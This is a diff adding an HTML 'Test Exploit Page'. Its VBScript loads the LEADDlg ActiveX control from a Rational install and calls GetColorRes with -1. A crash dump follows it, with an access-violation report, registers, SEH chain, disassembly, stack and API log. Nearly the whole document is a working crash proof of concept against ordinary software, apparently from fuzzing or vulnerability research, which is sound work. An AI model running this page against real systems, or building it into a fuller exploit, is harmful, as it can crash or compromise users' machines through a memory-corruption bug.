@@ -1,0 +1,89 @@
+<html>
+Test Exploit Page
+<object classid='clsid:00110060-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' /></object>
+<script language='vbscript'>
+targetFile = "C:\Program Files\Rational\common\ltdlg11n.ocx"
+prototype  = "Function GetColorRes ( ByVal hWnd As Long ) As Integer"
+memberName = "GetColorRes"
+progid     = "LEADDlgLib.LEADDlg"
+argCount   = 1
+
+arg1=-1
+
+target.GetColorRes arg1 
+
+</script>
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 7E428FB5	MOV [EAX],ECX
+
+Seh Chain:
+--------------------------------------------------
+1 	73352960 	VBSCRIPT.dll
+2 	7C839AD8 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+USER32.7E428FB5               LTKRN11n.2000A033             
+
+
+Registers:
+--------------------------------------------------
+EIP 7E428FB5 -> 8B044689
+EAX 7713643C -> 8B044689
+EBX 00000000
+ECX 00000000
+EDX 00000001
+EDI 02AB1FE0 -> 00000000
+ESI 771363F8 -> F33BF08B
+EBP 0013EC60 -> 00000000
+ESP 0013EC60 -> 00000000
+
+
+Block Disassembly: 
+--------------------------------------------------
+7E428FA8	PUSH EBP
+7E428FA9	MOV EBP,ESP
+7E428FAB	MOV EAX,[EBP+8]
+7E428FAE	TEST EAX,EAX
+7E428FB0	JE SHORT 7E428FCC
+7E428FB2	MOV ECX,[EBP+C]
+7E428FB5	MOV [EAX],ECX	  <--- CRASH
+7E428FB7	MOV ECX,[EBP+10]
+7E428FBA	MOV [EAX+4],ECX
+7E428FBD	MOV ECX,[EBP+14]
+7E428FC0	MOV [EAX+8],ECX
+7E428FC3	MOV ECX,[EBP+18]
+7E428FC6	MOV [EAX+C],ECX
+7E428FC9	XOR EAX,EAX
+7E428FCB	INC EAX
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	7713643C -> 8B044689
+EBP+12	00000000
+EBP+16	00000000
+EBP+20	00000000
+EBP+24	00000000
+EBP+28	02AB1FE0 -> 00000000
+
+
+Stack Dump:
+--------------------------------------------------
+13EC60 00 00 00 00 33 A0 00 20 3C 64 13 77 00 00 00 00  [.........d.w....]
+13EC70 00 00 00 00 00 00 00 00 00 00 00 00 E0 1F AB 02  [................]
+13EC80 D4 EC 13 00 20 1A FF 1F F8 63 13 77 E0 1F AB 02  [.........c.w....]
+13EC90 B4 ED 13 00 3A 11 BE 1F D4 EC 13 00 AC ED 13 00  [................]
+13ECA0 E0 1F AB 02 58 1F AB 02 F8 1E AB 02 00 00 00 00  [....X...........]
+
+
+
+ApiLog
+--------------------------------------------------
+
+***** Installing Hooks *****
+7c821a94     CreateFileA(C:\WINDOWS\system32\rsaenh.dll)
+7c821a94     CreateFileA(C:\WINDOWS\system32\rsaenh.dll)
